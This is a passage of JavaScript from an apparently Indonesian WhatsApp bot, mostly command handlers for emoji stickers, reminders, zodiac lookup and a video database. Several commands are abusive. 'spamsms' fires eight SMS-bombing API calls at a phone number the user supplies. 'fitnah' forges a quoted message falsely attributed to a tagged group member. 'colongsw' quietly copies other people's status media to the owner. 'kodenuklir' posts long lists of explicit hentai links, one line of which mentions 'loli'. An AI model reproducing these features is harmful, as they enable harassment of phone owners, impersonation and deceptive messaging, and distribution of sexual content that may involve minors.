if (_video.includes(q)) {
let anu = _video.indexOf(q)
_video.splice(q, 1)
fs.writeFileSync('./database/video.json', JSON.stringify(_video))
fs.unlinkSync(`./media/video/${q}.mp4`)
reply(`Video berhasil dihapus dari database!`)
} else {
reply(`Video tidak ditemukan!`)
}
}
break
case 'videolist':
case 'listvideo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let videoList = `*── 「 VIDEO DATABASE 」 ──*\n\nTotal: ${_video.length}\n\n`
for (let i of _video) {
videoList += `➸ ${i.replace(_video)}\n`
}
textImg(videoList)
break

case 'baka':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (mentioned.length !== 0){
fetchJson ('https://www.nekos.life/api/v2/img/baka').then(({url}) => {
//sendFileFromUrl(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
mentions(`@${mentioned[0].split('@')[0]} Baka!!`, [sender, mentioned[0]], true)})
} else {
reply(`Penggunaan ${command} @tag`)
}
break

case 'kodenuklir':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
try {
varpporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
} catch {
var pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
}
let fsur = await getBuffer(pporang)
var kodenuklir = `
*Easy Mode :*
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
*Medium Mode :*
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
*Hard Mode :*
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/
*Note :*
Easy mode = Sange, Biasa Aja, Mental Lemah :v
==============================
Medium Mode = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
Hard Mode = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
Kode nuklir dr milf oneesan ampe gan***** loli
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
Happy Mother's Day 165310,177978,211759,212643,229540, 250029,211519,256097,163478, 91505, 79280, 260629,128051,121972,261633,172044,119055,208323,149942,161236, 177150,233766,97949,230107 ,175822, 213545,232837,179166,138603,130183, 173543,234642,268015,228293,268893, 239536, yg suka mamah

*Random:*
257892 226942 236297 216039 221711 245304 166174 175220 244327 191049 220882 244859 227446 259328 259532 259634 259610 259348 258669 256097 118282 260028 260058 259557 259497 122220 260111 260088 259880 258977 260097 259765 259359 260138 259617 107965 197255 260276 260209 260210 260203 191360 191390 248933 257567 227913 211648 210240 260626 259622 257991 213966 260623 149112 257168 198203 114783 220958 244387 243734 223315 118069 136188 260686 241777260912 142154 119798 261174 258301 256808 169134 220354 260271 261725 261378 252174 261928 114427 187003 147577 249458 157767 224316 175294 258450 233864 236128 261162 174036 187205 210873 193318 110232 199310 193816 220376 193814 193815 219068 220386 177642 188269 181837 220377 119293 257528 258926 262384 105951 259904 208174 249229 245644 262538 234818 216845 149212 134442 135927 262447 261811 261650 261225 261226 260761 250327 192327 167801 150309 123554`
surya.sendMessage(from, fsur, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 210505, status: 200, thumbnail: fs.readFileSync('./sticker/thumb.jpeg'), surface: 200, message: `${Ucapan}\n⎇ ${pushname}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, caption: kodenuklir, contextInfo: { forwardingScore: 508, isForwarded: true}})
break

case 'semoji': case 'smoji':case 'emoji':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
textImg(`
┌〔 Opsi 〕
├ ap = apple
├ fa = facebook
├ ig = instagram
├ go = google
├ ht = htc
├ mi = microsoft
├ mo = mozilla
├ op = openmoji
├ pi = pixel
├ sm = samsung
├ tw = twitter
├ wh = whatsapp
└────────

*Contoh penggunaan :*
${prefix}ap 🙂`)
break

case 'apple':
case 'app':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[0].url)
limitAdd(sender, limit)
})
break 
/*case 'facebook': case 'fb':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[6].url)
limitAdd(sender, limit)
})
break
case 'google':
case 'go':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[1].url)
limitAdd(sender, limit)
})
break
case 'htc': case 'ht':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[12].url)
limitAdd(sender, limit)
})
break
case 'ig': case 'igemoji':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[11].url)
limitAdd(sender, limit)
})
break
case 'microsoft': case 'mc': case 'mi':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[3].url)
limitAdd(sender, limit)
})
break
case 'mozilla': case 'moz': case 'mo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[13].url)
limitAdd(sender, limit)
})
break
case 'openmoji': case 'omoji': case 'op':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[8].url)
limitAdd(sender, limit)
})
break
case 'pixel': case 'pi':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[7].url)
limitAdd(sender, limit)
})
break
case 'samsung': case 'sm':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[2].url)
limitAdd(sender, limit) 
})
break
case 'twitter': case 'tw':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[5].url)
limitAdd(sender, limit)
})
break*/
case 'whatsapp': case 'wh':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`Emojinya mana?`)
emoji.get(`${args[1]}`)
.then(async emoji => {
sendStickerUrl(from, emoji.images[4].url)
limitAdd(sender, limit)
})
break

case 'spamsms':{
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (args.length > 2) return reply(`Cara penggunaan : ${command} no hp`)
if (isNaN(args[1])) return reply(`Harus berupa angka`)
try {
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${lolkey}&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=${lolkey}&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=${lolkey}&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=${lolkey}&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=${lolkey}&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=${lolkey}&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=${lolkey}&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${lolkey}&nomor=${args[1]}`)
reply("Success")
} catch (err) {
sendMess(Suryaa, `${command} Error:` + err)
reply(mess.error.api)
}
}
break
case 'kalkulator': case 'hitung':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return reply(`yang mau di itung mana?`)
if (typeof mathjs.evaluate(q) !== 'number') {
await reply(`${q} ini bukan angka!`)
} else {
reply(`*── 「 MATH 」 ──*\n\n${q} = ${mathjs.evaluate(q)}`)
}
limitAdd(sender, limit)
break
case 'jadibot':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if(!fromMe && !isOwner2 && !isOwner) return mentions(`Perintah ini hanya khusus @${ownerS} !`, [`${ownerS}@s.whatsapp.net`], true)
//if (isGroup) return reply(`*Fitur Hanya dapat digunakan dalam Private Chat! => wa.me/${6285743780860}?text=${prefix}jadibot*`)
jadibot(textImg,surya,from, msg)
break

case 'stopjadibot':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if(!fromMe && !isOwner2 && !isOwner)return mentions(`Perintah ini hanya khusus @${ownerS} !`, [`${ownerS}@s.whatsapp.net`], true)
stopjadibot(textImg)
break

case 'listbot':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tekss = 'LIST MECHA BOTZ\n\n'
let lbt = [];
for(let i of listjadibot) {
lbt.push(i.jid)
tekss += `Nama : ${i.name}
Tag : @${i.jid.split('@')[0]}
Device : ${i.phone.device_manufacturer}
Model : ${i.phone.device_model}\n\n`
}
mentions(monospace(tekss), lbt, true)
limitAdd(sender, limit)
break


case 'caripesan': case 'searchmsg':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isOwner && !fromMe && !isOwner2)return mentions(`Perintah ini hanya khusus @${ownerS} !`, [`${ownerS}@s.whatsapp.net`], true)
if (args.length < 1) return reply(`*Format Error!*\n\n*Example :*\n • ${prefix + command} bot|10`)
let tekse = args.join(' ')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 201) return reply('minimum 21')
let sampai = `${za}`
let batas = parseInt(sampai) + 1
let cok = await surya.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Pesan tidak ditemukan') 
if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
surya.sendMessage(from, `Ini Pesannya!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
}
} else {
reply(`Error`)
}
break
case 'hbd': case 'zodiac': case 'zodiak':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let textus = args.join(" ")
if (!q) return reply(`Contoh : ${prefix + command} 2005 05 21`)
const zodiak = [
["Capricorn",new Date(1970, 0, 1)],
["Aquarius",new Date(1970, 0, 20)],
["Pisces",new Date(1970, 1, 19)],
["Aries",new Date(1970, 2, 21)],
["Taurus",new Date(1970, 3, 21)],
["Gemini",new Date(1970, 4, 21)],
["Cancer",new Date(1970, 5, 22)],
["Leo",new Date(1970, 6, 23)],
["Virgo",new Date(1970, 7, 23)],
["Libra",new Date(1970, 8, 23)],
["Scorpio",new Date(1970, 9, 23)],
["Sagittarius", new Date(1970, 10, 22)],
["Capricorn",new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
const date = new Date(textus)
if (date == 'Invalid Date') throw date
const d = new Date()
const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
const birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

const zodiac = getZodiac(birth[1], birth[2])
const ageD = new Date(d - date)
const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

const teksh = `
Data punya ${pushname}

Ultah : ${birth.join('-')}

Ultah mendatang : ${birthday.join('-')}

Umur : ${cekusia}

Zodiak : ${zodiac}
`.trim()
reply(monospace(teksh))
limitAdd(sender, limit)
break
case 'revoke':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!fromMe && !isOwner2 && !isOwner) return mentions(mess.OnlySurya, [Suryaa], true)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!isGroup) return reply(mess.OnlyGrup)
surya.revokeInvite(from)
reply(`${S}Succes revoke link group${S}`)
limitAdd(sender, limit)
break
case 'colongsw':
if (!fromMe && !isOwner && !isOwner2) return reply(`perintah ini hanya bisa di gunakan oleh bot`)
if ((isMedia && !msg.message.videoMessage) || isQuotedImage) {
let ger = isQuotedImage
? JSON.parse(JSON.stringify(msg).replace("quotedM", "m")).message.extendedTextMessage.contextInfo
: msg
let owgi = await surya.downloadAndSaveMediaMessage(ger);
surya.sendMessage(Suryaa, fs.readFileSync(owgi), "imageMessage", {
caption: q,
});
fakestatus("Sukses");
fs.unlinkSync(owgi);
} else if ((isMedia && !msg.message.videoMessage) || isQuotedVideo) {
let ger = isQuotedVideo
? JSON.parse(JSON.stringify(msg).replace("quotedM", "m")).message
.extendedTextMessage.contextInfo
: msg;
let owgi = await surya.downloadAndSaveMediaMessage(ger);
surya.sendMessage(Suryaa, fs.readFileSync(owgi), "videoMessage", {
caption: q,
})
fakestatus(`Sukses`)
fs.unlinkSync(owgi)
} else {
fakestatus(`Reply sw foto / video yg mau dicolong`)
}
break
case 'fitnah':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !isPremium && !fromMe && !isOwner2) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!q) return textImg(`Usage :\n${prefix}fitnah @tag|pesan|balasanbot\n\nContoh : \n${prefix}fitnah @tagmember|hai|hai juga`)
var gh = args.join(" ")
let anjir = msg.message.extendedTextMessage.contextInfo.mentionedJid
var replace = gh.split("|")[0];
var target = gh.split("|")[1];
var bot = gh.split("|")[2];
surya.sendMessage(from, `${bot}`, text, {
quoted: {
key: {
fromMe: false,
participant: `${anjir}`,
...(from ? { remoteJid: from } : {}),
},
message: { conversation: `${target}` },
},
})
break

case 'reminder': case 'pengingat': // By Slavyan
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (!q) return reply(`CONTOH PENGGUNANNYA:\n${prefix}reminder 2m teks\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`)
const timeRemind = args[1].toString()
const messRemind = q.slice(args[1].length + 1, q.length)
let typeRemind = 'Text'
if (isQuotedImage) typeRemind = "Image"
if (isQuotedVideo) typeRemind = "Video"
if (isQuotedSticker) typeRemind = "Sticker"
if (isQuotedAudio) typeRemind = "Audio"
if (!isQuotedImage && !isQuotedVideo && !isQuotedAudio && !isQuotedSticker)
typeRemind = 'Text'
const parsedTime = ms(toMs(timeRemind));
reminder.addReminder(sender, messRemind, typeRemind, timeRemind, _reminder)
if (!isQuotedImage && !isQuotedVideo && !isQuotedSticker && !isQuotedAudio) {
await surya.sendMessage(from,
` *── 「 PENGINGAT 」 ──*
 
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${parsedTime.seconds} detik
➸ Untuk: @${sender.split("@")[0]}`, text, {contextInfo: {mentionedJid: [sender]}})
const intervRemind = setInterval(async () => {
if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
let anu = await reminder.getReminderMsg(sender, _reminder);
surya.sendMessage(from, 
` *── 「 PENGINGAT 」 ──*

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: Text`, text, {contextInfo: {mentionedJid: [sender]}})
_reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
fs.writeFileSync("./database/reminder.json", JSON.stringify(_reminder))
clearInterval(intervRemind)
}
}, 1000)
gameAdd(sender, glimit)
} else if (isQuotedSticker) {
let encmedia = JSON.parse(JSON.stringify(msg).replace("quotedM", "m")).message.extendedTextMessage.contextInfo;
let media = await surya.downloadAndSaveMediaMessage(encmedia);
await surya.sendMessage(from,
` *── 「 PENGINGAT 」 ──*
 
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${parsedTime.seconds} detik
➸ Untuk: @${sender.split("@")[0]}`, text, {contextInfo: {mentionedJid: [sender]}})
const intervRemind = setInterval(async () => {
if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
let anu = await reminder.getReminderMsg(sender, _reminder);
const buttons = [{buttonId: 'y', buttonText: {displayText: 'Orangnya ngilang ditelen bumi'}, type: 1}]
const buttonsMessage = {
contentText: `
 *── 「 PENGINGAT 」 ──*

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: Sticker`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [sender], quoted: ftroli}})
surya.sendMessage(from, fs.readFileSync(media), sticker);
_reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
fs.writeFileSync("./database/reminder.json", JSON.stringify(_reminder))
clearInterval(intervRemind);
}
}, 1000)
gameAdd(sender, glimit)
} else if (isQuotedImage) {
let encmedia = JSON.parse(JSON.stringify(msg).replace("quotedM", "m")).message.extendedTextMessage.contextInfo
let media = await surya.downloadAndSaveMediaMessage(encmedia);
await surya.sendMessage(from,
` *── 「 PENGINGAT 」 ──*
 
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${parsedTime.seconds} detik
➸ Untuk: @${sender.split("@")[0]}`, text, {contextInfo: {mentionedJid: [sender]}})
const intervRemind = setInterval(async () => {
if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
let anu = await reminder.getReminderMsg(sender, _reminder);
let yangimage = ` *── 「 PENGINGAT 」 ──*

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: Image`
surya.sendMessage(from, fs.readFileSync(media), image, {contextInfo: {forwardingScore: 1000, isForwarded: false, mentionedJid: [sender]}, quoted: msg, caption: yangimage})
_reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
fs.writeFileSync("./database/reminder.json", JSON.stringify(_reminder))
clearInterval(intervRemind)
}
}, 1000)
gameAdd(sender, glimit)
} else if (isQuotedVideo) {
let encmedia = JSON.parse(JSON.stringify(msg).replace("quotedM", "m")).message.extendedTextMessage.contextInfo;
let media = await surya.downloadAndSaveMediaMessage(encmedia);
await surya.sendMessage(from,
` *── 「 PENGINGAT 」 ──*
 
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Video
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${parsedTime.seconds} detik
➸ Untuk: @${sender.split("@")[0]}`, text, {contextInfo: {mentionedJid: [sender]}})
const intervRemind = setInterval(async () => {
if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
let anu = await reminder.getReminderMsg(sender, _reminder);
let inivideo = ` *── 「 PENGINGAT 」 ──*

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: Video`
surya.sendMessage(from, fs.readFileSync(media), video, {contextInfo: { forwardingScore: 9999, isForwarded: false, mentionedJid: [sender]},quoted: msg, caption: inivideo})
_reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
fs.writeFileSync("./database/reminder.json", JSON.stringify(_reminder))
clearInterval(intervRemind)
}
}, 1000)
gameAdd(sender, glimit)
} else if (isQuotedAudio) {
let encmedia = JSON.parse(JSON.stringify(msg).replace("quotedM", "m")).message.extendedTextMessage.contextInfo;
let media = await surya.downloadAndSaveMediaMessage(encmedia);
await surya.sendMessage(from,
` *── 「 PENGINGAT 」 ──*
 
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${parsedTime.seconds} detik
➸ Untuk: @${sender.split("@")[0]}`, text, {contextInfo: {mentionedJid: [sender]}})
const intervRemind = setInterval(async () => {
if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
let anu = await reminder.getReminderMsg(sender, _reminder)
const buttons = [{buttonId: 'y', buttonText: {displayText: 'Orangnya ngilang ditelen bumi'}, type: 1}]
const buttonsMessage = {
contentText: `
 *── 「 PENGINGAT 」 ──*

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: Audio`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [sender], quoted: ftroli}})
surya.sendMessage(from, fs.readFileSync(media), audio, {contextInfo: {mentionedJid: [sender]}, mimetype: "audio/mp4", ptt: true});
_reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
fs.writeFileSync("./database/reminder.json", JSON.stringify(_reminder))
clearInterval(intervRemind)
}
}, 1000)
gameAdd(sender, glimit)
}
break

case 'menu2':
